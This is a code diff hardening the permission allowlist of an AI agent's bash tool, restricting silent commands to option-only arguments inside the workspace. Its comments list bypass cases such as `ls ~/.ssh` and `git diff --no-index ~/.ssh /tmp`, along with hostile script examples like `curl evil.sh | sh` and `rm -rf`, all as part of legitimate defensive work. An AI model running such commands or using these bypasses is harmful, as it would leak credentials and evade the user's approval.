@@ -34,60 +34,83 @@ import { spawn } from 'node:child_process';
 import { parseBashRiskyOps } from '../../safety/bashRiskParser.js';
 import { requestBashOp } from '../../safety/fileSafetyGate.js';
 
-// Phase 2D follow-up #1 (Codex 🔴): explicit allowlist of commands
-// the agent runs constantly and that have no file side-effect AND
-// no arbitrary path read. Anything not on this list prompts —
-// includes `cat`, `grep`, `head`, `tail`, etc. (which CAN read
-// sensitive paths and exfiltrate via stdout). Match-fn signature:
-// (head: string, args: string[]) => boolean.
+// Phase 2D follow-up #3 (Codex 🔴, 2026-05-04): unified allowlist
+// rule — silent ONLY when (a) every non-position-0 arg is an
+// option flag (starts with `-`, or `+` for date format), and
+// (b) the cwd is inside workspacePath (no cwdOverride to
+// arbitrary dirs like /etc). This kills the entire class of
+// "allowlisted command + sensitive path arg" bypasses:
+//   ls ~/.ssh                         → arg doesn't start with -
+//   git diff --no-index ~/.ssh /tmp   → trailing paths aren't options
+//   git log -- some/path              → "--" then "some/path" path
+//   ls (cwdOverride: /etc)            → cwd outside workspace
+// All fall to the default-deny path → prompt.
+//
+// Match-fn signature: (head, args) => boolean — only checks
+// head + arg-shape, NOT cwd. cwd check is done separately in
+// isInAllowlist.
+
+// Are all args option flags? Empty args is allowed (no-op forms
+// like `pwd`, `git status`).
+function allOptionsOnly(args, allowedPrefixes = ['-']) {
+  return args.every(arg => allowedPrefixes.some(p => arg.startsWith(p)));
+}
+
 const SILENT_ALLOWLIST = [
   // Pure status / identity / no-arg utilities
-  { match: (h, a) => h === 'ls' && a.every(arg => arg.startsWith('-') || /^[\w./@~-]+$/.test(arg)) },
   { match: (h, a) => h === 'pwd' && a.length === 0 },
   { match: (h, a) => h === 'whoami' && a.length === 0 },
-  { match: (h, a) => h === 'date' && a.every(arg => arg.startsWith('+') || arg.startsWith('-') || /^[\w-]+$/.test(arg)) },
+  { match: (h, a) => h === 'date' && allOptionsOnly(a, ['-', '+']) },
+  { match: (h, a) => h === 'ls' && allOptionsOnly(a) },
   { match: (h, a) => h === 'echo' && a.every(arg => !/[`$<>|&;(){}\\]/.test(arg)) },
-  // git read-only subcommands
+  // git read-only subcommands. Position 0 IS the subcommand (allowed
+  // even though it's not option-prefixed); positions 1+ must all
+  // start with `-`. This refuses `git diff path/...`, `git log --
+  // path`, `git diff --no-index a b`, etc — anything where a path
+  // could leak content.
   { match: (h, a) => h === 'git' && (
       a[0] === 'status' || a[0] === 'log' || a[0] === 'diff' ||
       a[0] === 'branch' || a[0] === 'show' || a[0] === 'rev-parse' ||
-      a[0] === 'remote' || a[0] === 'config' && a[1] === '--get' ||
-      a[0] === 'describe' || a[0] === 'tag' && (a.length === 1 || a[1] === '-l' || a[1] === '--list')
-    ) && !a.includes('--exec') && !a.some(x => x.startsWith('--upload-pack'))
+      a[0] === 'remote' || a[0] === 'describe'
+    ) && allOptionsOnly(a.slice(1))
+       // explicit deny-list of options that load remote config or
+       // arbitrary external paths
+       && !a.includes('--no-index')
+       && !a.some(x => x === '--exec' || x.startsWith('--exec='))
+       && !a.some(x => x === '--upload-pack' || x.startsWith('--upload-pack='))
+       && !a.some(x => x.startsWith('--textconv'))
   },
-  // Phase 2D follow-up #2 (Codex 🟠, 2026-05-04): npm/pnpm/yarn
-  // test/run/list/view/ls/why are NO LONGER silent. package.json
-  // scripts are arbitrary shell — an attacker (or careless dev)
-  // can put `rm -rf x` / `cat ~/.ssh/...` / `curl evil.sh | sh`
-  // in `scripts.test`. Even read-only-looking commands like
-  // `npm view <pkg>` fetch over network, which is its own
-  // sensitivity question. So: every package-manager invocation
-  // prompts (default-deny path falls through). Removed:
-  //   - npm test|run|list|ls|view
-  //   - pnpm test|run|list|ls
-  //   - yarn test|run|list|why
-  //
-  // Only true read-only metadata + no-script invocations remain
-  // (and only the version probe — anything else loads npm's own
-  // arbitrary script execution paths).
-  { match: (h, a) => h === 'node' && (a.includes('--version') || a[0] === '-v' || a[0] === '--version') },
-  // language toolchain version checks
-  { match: (h, a) => /^(python3?|ruby|perl|go|cargo|rustc)$/.test(h) && (a.includes('--version') || a[0] === '-v' || a[0] === '--version') },
-  // which / type / command — lookup utilities
-  { match: (h, a) => h === 'which' && a.every(arg => /^[\w.-]+$/.test(arg)) },
-  { match: (h, a) => h === 'type' && a.every(arg => /^[\w.-]+$/.test(arg)) },
+  { match: (h, a) => h === 'node' && (a[0] === '-v' || a[0] === '--version' || a.includes('--version')) },
+  // language toolchain version checks — option flags only
+  { match: (h, a) => /^(python3?|ruby|perl|go|cargo|rustc)$/.test(h)
+                     && (a[0] === '-v' || a[0] === '-V' || a[0] === '--version' || a.includes('--version'))
+                     && a.every(arg => arg.startsWith('-')) },
+  // which / type — lookup utilities. Restrict to bare binary names
+  // (no slashes, dots, tildes, leading dash) so `which ./malicious`
+  // / `which ~/.ssh/foo` go through the prompt.
+  { match: (h, a) => h === 'which' && a.length > 0 && a.every(arg => /^[\w-]+$/.test(arg) && !arg.startsWith('-')) },
+  { match: (h, a) => h === 'type' && a.length > 0 && a.every(arg => /^[\w-]+$/.test(arg) && !arg.startsWith('-')) },
 ];
 
-function isInAllowlist(command) {
-  // Reject anything with shell metachars at the surface that could
-  // affect dispatch (pipes, redirects, substitution, &&, ||, ;).
-  // The parser's hasShellSubstitution / shellRedirect detection
-  // would also catch these, but a quick string check here keeps
-  // allowlist ascii-clean and obviously-safe.
+function cwdInsideWorkspace(cwd, workspacePath) {
+  if (!workspacePath || typeof workspacePath !== 'string') return false;
+  if (!cwd || typeof cwd !== 'string') return false;
+  if (cwd === workspacePath) return true;
+  // Append separator so `/ws-foo` doesn't match prefix of `/ws/...`.
+  const wsWithSep = workspacePath.endsWith('/') ? workspacePath : workspacePath + '/';
+  return cwd.startsWith(wsWithSep);
+}
+
+function isInAllowlist(command, cwd, workspacePath) {
+  // Phase 2D follow-up #3: cwd MUST be inside workspacePath. An
+  // explicit `cwdOverride` to /etc / ~ / etc lets allowlisted
+  // commands run in a sensitive directory and silently leak its
+  // contents (e.g. `ls` in /etc reveals system file names).
+  if (!cwdInsideWorkspace(cwd, workspacePath)) return false;
+  // Reject any shell metachars / quotes at the surface — these
+  // could affect dispatch (pipes, redirects, substitution) or
+  // hide arbitrary content the parser sees through.
   if (/[`$|&;<>(){}]/.test(command)) return false;
-  // splitCommands tokenizes; for allowlist checking we want the raw
-  // single-command form anyway. Trim + split by whitespace, respect
-  // quotes minimally — if quotes are present we just refuse silent.
   if (/['"\\]/.test(command)) return false;
   const parts = command.trim().split(/\s+/);
   if (parts.length === 0) return false;
@@ -173,7 +196,10 @@ export const bashTool = {
     //   3. otherwise → prompt (even if no risks — read-class lives here)
     const parsed = parseBashRiskyOps(command);
     const risks = parsed.risks;
-    const allowlisted = risks.length === 0 && isInAllowlist(command);
+    // Pre-compute cwd here so isInAllowlist can validate it sits
+    // inside workspacePath (Phase 2D follow-up #3).
+    const effectiveCwd = cwdOverride || workspacePath || process.cwd();
+    const allowlisted = risks.length === 0 && isInAllowlist(command, effectiveCwd, workspacePath);
 
     if (!allowlisted) {
       // Synthesize an `unknown` risk for empty risks so requestBashOp
@@ -201,7 +227,7 @@ export const bashTool = {
     }
 
     const clampedTimeout = Math.min(Math.max(timeout, 1000), 120_000);
-    const cwd = cwdOverride || workspacePath || process.cwd();
+    const cwd = effectiveCwd;
 
     return new Promise((resolve) => {
       let stdout = '';
